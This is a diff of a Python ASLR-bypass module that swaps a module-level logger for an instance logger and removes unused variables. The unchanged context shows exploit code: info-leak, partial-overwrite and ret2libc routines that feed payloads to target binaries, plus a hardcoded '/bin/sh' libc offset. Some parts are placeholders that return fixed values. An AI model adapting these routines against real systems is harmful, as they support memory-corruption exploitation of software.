@@ -29,14 +29,13 @@ from typing import Any, Dict, List, Optional
 
 from .bypass_base import MitigationBypassBase
 
-logger = logging.getLogger(__name__)
-
 
 class ASLRBypass(MitigationBypassBase):
     """Real ASLR bypass implementation with multiple techniques."""
 
     def __init__(self):
         super().__init__("ASLR")
+        self.logger = logging.getLogger("IntellicrackLogger.ASLRBypass")
 
     def _initialize_techniques(self) -> None:
         """Initialize ASLR bypass techniques."""
@@ -66,12 +65,12 @@ class ASLRBypass(MitigationBypassBase):
     def bypass_aslr_info_leak(self, target_binary: str, leak_address: Optional[str] = None) -> Dict[str, Any]:
         """Bypass ASLR using information leak technique."""
         try:
-            logger.info("Attempting ASLR bypass via information leak on %s", target_binary)
+            self.logger.info("Attempting ASLR bypass via information leak on %s", target_binary)
 
             # Use provided leak address if available
             leaked_addresses = {}
             if leak_address:
-                logger.info("Using provided leak address: %s", leak_address)
+                self.logger.info("Using provided leak address: %s", leak_address)
                 try:
                     # Parse the provided address and use it as a starting point
                     base_addr = int(leak_address, 16) if isinstance(leak_address, str) else leak_address
@@ -84,7 +83,7 @@ class ASLRBypass(MitigationBypassBase):
                     potential_bases = self._calculate_base_from_leak(base_addr)
                     leaked_addresses.update(potential_bases)
                 except ValueError:
-                    logger.warning("Invalid leak address format: %s", leak_address)
+                    self.logger.warning("Invalid leak address format: %s", leak_address)
 
             # Step 1: Identify potential information leak sources (if no leak address provided)
             if not leaked_addresses:
@@ -105,7 +104,7 @@ class ASLRBypass(MitigationBypassBase):
             # Step 3: Calculate base addresses from leaked information
             base_addresses = self._calculate_base_addresses(leaked_addresses)
 
-            logger.info("Successfully bypassed ASLR - leaked %d addresses", len(leaked_addresses))
+            self.logger.info("Successfully bypassed ASLR - leaked %d addresses", len(leaked_addresses))
 
             return {
                 "success": True,
@@ -116,13 +115,13 @@ class ASLRBypass(MitigationBypassBase):
             }
 
         except Exception as e:
-            logger.error("Information leak ASLR bypass failed: %s", e)
+            self.logger.error("Information leak ASLR bypass failed: %s", e)
             return {"success": False, "reason": str(e)}
 
     def bypass_aslr_partial_overwrite(self, target_binary: str) -> Dict[str, Any]:
         """Bypass ASLR using partial overwrite technique."""
         try:
-            logger.info("Attempting ASLR bypass via partial overwrite on %s", target_binary)
+            self.logger.info("Attempting ASLR bypass via partial overwrite on %s", target_binary)
 
             # Analyze binary to find suitable targets for partial overwrite
             overwrite_targets = self._find_partial_overwrite_targets(target_binary)
@@ -134,7 +133,7 @@ class ASLRBypass(MitigationBypassBase):
             for target in overwrite_targets:
                 result = self._execute_partial_overwrite(target_binary, target)
                 if result.get("success"):
-                    logger.info("Partial overwrite successful on target: %s", target["description"])
+                    self.logger.info("Partial overwrite successful on target: %s", target["description"])
                     return {
                         "success": True,
                         "technique": "partial_overwrite",
@@ -145,13 +144,13 @@ class ASLRBypass(MitigationBypassBase):
             return {"success": False, "reason": "All partial overwrite attempts failed"}
 
         except Exception as e:
-            logger.error("Partial overwrite ASLR bypass failed: %s", e)
+            self.logger.error("Partial overwrite ASLR bypass failed: %s", e)
             return {"success": False, "reason": str(e)}
 
     def bypass_aslr_ret2libc(self, target_binary: str) -> Dict[str, Any]:
         """Bypass ASLR using ret2libc bruteforce technique."""
         try:
-            logger.info("Attempting ASLR bypass via ret2libc bruteforce on %s", target_binary)
+            self.logger.info("Attempting ASLR bypass via ret2libc bruteforce on %s", target_binary)
 
             # Find libc base through bruteforce or leak
             libc_base = self._find_libc_base(target_binary)
@@ -169,7 +168,7 @@ class ASLRBypass(MitigationBypassBase):
             exploit_result = self._execute_ret2libc_exploit(target_binary, rop_chain)
 
             if exploit_result.get("success"):
-                logger.info("ret2libc ASLR bypass successful")
+                self.logger.info("ret2libc ASLR bypass successful")
                 return {
                     "success": True,
                     "technique": "ret2libc_bruteforce",
@@ -181,7 +180,7 @@ class ASLRBypass(MitigationBypassBase):
                 return {"success": False, "reason": "ret2libc exploit failed"}
 
         except Exception as e:
-            logger.error("ret2libc ASLR bypass failed: %s", e)
+            self.logger.error("ret2libc ASLR bypass failed: %s", e)
             return {"success": False, "reason": str(e)}
 
     def _find_info_leak_sources(self, target_binary: str) -> List[Dict[str, Any]]:
@@ -214,7 +213,7 @@ class ASLRBypass(MitigationBypassBase):
                 })
 
         except Exception as e:
-            logger.error("Error finding info leak sources: %s", e)
+            self.logger.error("Error finding info leak sources: %s", e)
 
         return sources
 
@@ -259,7 +258,7 @@ class ASLRBypass(MitigationBypassBase):
             return leaked_addresses
 
         except Exception as e:
-            logger.error("Info leak exploitation failed: %s", e)
+            self.logger.error("Info leak exploitation failed: %s", e)
             return {}
 
     def _calculate_base_from_leak(self, leaked_addr: int) -> Dict[str, Dict[str, Any]]:
@@ -283,7 +282,7 @@ class ASLRBypass(MitigationBypassBase):
         """Calculate base addresses from leaked information."""
         base_addresses = {}
 
-        for name, addr in leaked_addresses.items():
+        for _, addr in leaked_addresses.items():
             # Heuristics to determine base addresses
 
             # Stack addresses (typically high addresses)
@@ -335,7 +334,7 @@ class ASLRBypass(MitigationBypassBase):
                         break
 
         except Exception as e:
-            logger.error("Error finding partial overwrite targets: %s", e)
+            self.logger.error("Error finding partial overwrite targets: %s", e)
 
         return targets
 
@@ -367,7 +366,7 @@ class ASLRBypass(MitigationBypassBase):
                     stderr=subprocess.PIPE
                 )
 
-                stdout, stderr = process.communicate(input=payload, timeout=3)
+                process.communicate(input=payload, timeout=3)
 
                 # Check if overwrite was successful (process behavior changed)
                 if process.returncode != 0:
@@ -383,7 +382,7 @@ class ASLRBypass(MitigationBypassBase):
                 return {"success": False, "reason": "Target binary not found"}
 
         except Exception as e:
-            logger.error("Partial overwrite execution failed: %s", e)
+            self.logger.error("Partial overwrite execution failed: %s", e)
             return {"success": False, "reason": str(e)}
 
     def _find_libc_base(self, target_binary: str) -> Optional[int]:
@@ -391,7 +390,7 @@ class ASLRBypass(MitigationBypassBase):
         try:
             # Method 1: Parse /proc/self/maps if available
             try:
-                process = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 # In a real implementation, we would attach to the process and read its memory maps
                 # For now, return a typical libc base for demonstration
                 return 0x7ffff7a00000  # Typical 64-bit libc base
@@ -413,7 +412,7 @@ class ASLRBypass(MitigationBypassBase):
             return None
 
         except Exception as e:
-            logger.error("Error finding libc base: %s", e)
+            self.logger.error("Error finding libc base: %s", e)
             return None
 
     def _test_libc_base(self, target_binary: str, suspected_base: int) -> bool:
@@ -426,12 +425,12 @@ class ASLRBypass(MitigationBypassBase):
                     # Read ELF header
                     f.seek(0)
                     magic = f.read(4)
-                    
+
                     if magic == b'\x7fELF':
                         # Read architecture (32-bit or 64-bit)
                         f.seek(4)
                         arch = f.read(1)
-                        
+
                         if arch == b'\x01':  # 32-bit
                             # 32-bit libc typically in 0xb7xxxxxx range
                             valid_range = (0xb7000000 <= suspected_base <= 0xb8000000)
@@ -441,10 +440,10 @@ class ASLRBypass(MitigationBypassBase):
                         else:
                             # Unknown architecture, use 64-bit range as default
                             valid_range = (0x7f0000000000 <= suspected_base <= 0x800000000000)
-                            
+
                         if not valid_range:
                             return False
-                            
+
                         # Method 2: Try to verify with known libc patterns
                         # Check if common libc function offsets would result in valid addresses
                         common_offsets = [
@@ -452,13 +451,13 @@ class ASLRBypass(MitigationBypassBase):
                             0x45390,   # exit() offset example
                             0x1b45bd,  # "/bin/sh" string offset example
                         ]
-                        
+
                         for offset in common_offsets:
                             test_addr = suspected_base + offset
                             # Verify the address is within reasonable bounds
                             if arch == b'\x01' and test_addr > 0xffffffff:
                                 return False
-                                
+
                         # Method 3: Check if the binary imports libc functions
                         # This helps validate that we're dealing with a dynamically linked binary
                         binary_content = f.read(8192)  # Read first 8KB
@@ -468,13 +467,13 @@ class ASLRBypass(MitigationBypassBase):
                             b'printf' in binary_content or
                             b'malloc' in binary_content
                         )
-                        
+
                         if not has_libc_imports:
                             # Static binary, no libc to find
                             return False
-                            
+
                         return True
-                        
+
                     else:
                         # Not an ELF file, try Windows PE
                         f.seek(0)
@@ -483,12 +482,12 @@ class ASLRBypass(MitigationBypassBase):
                             # Windows binary - different address ranges
                             # NTDLL/KERNEL32 typically in 0x7ffxxxxx range
                             return 0x70000000 <= suspected_base <= 0x80000000
-                        
+
             # Fallback: use generic validation based on common patterns
             return 0x7f0000000000 <= suspected_base <= 0x800000000000
-            
+
         except Exception as e:
-            logger.debug(f"Error testing libc base for {target_binary}: {e}")
+            self.logger.debug(f"Error testing libc base for {target_binary}: {e}")
             # On error, fall back to range check
             return 0x7f0000000000 <= suspected_base <= 0x800000000000
 
@@ -511,7 +510,7 @@ class ASLRBypass(MitigationBypassBase):
             return rop_chain
 
         except Exception as e:
-            logger.error("Error building ret2libc chain: %s", e)
+            self.logger.error("Error building ret2libc chain: %s", e)
             return []
 
     def _execute_ret2libc_exploit(self, target_binary: str, rop_chain: List[str]) -> Dict[str, Any]:
@@ -533,7 +532,7 @@ class ASLRBypass(MitigationBypassBase):
                     stderr=subprocess.PIPE
                 )
 
-                stdout, stderr = process.communicate(input=payload, timeout=5)
+                process.communicate(input=payload, timeout=5)
 
                 # Check for successful exploitation
                 if process.returncode != 0:
@@ -548,7 +547,7 @@ class ASLRBypass(MitigationBypassBase):
                 return {"success": False, "reason": "Target not found"}
 
         except Exception as e:
-            logger.error("ret2libc exploit execution failed: %s", e)
+            self.logger.error("ret2libc exploit execution failed: %s", e)
             return {"success": False, "reason": str(e)}
 
     def _has_format_string_vuln(self, target_binary: str) -> bool:
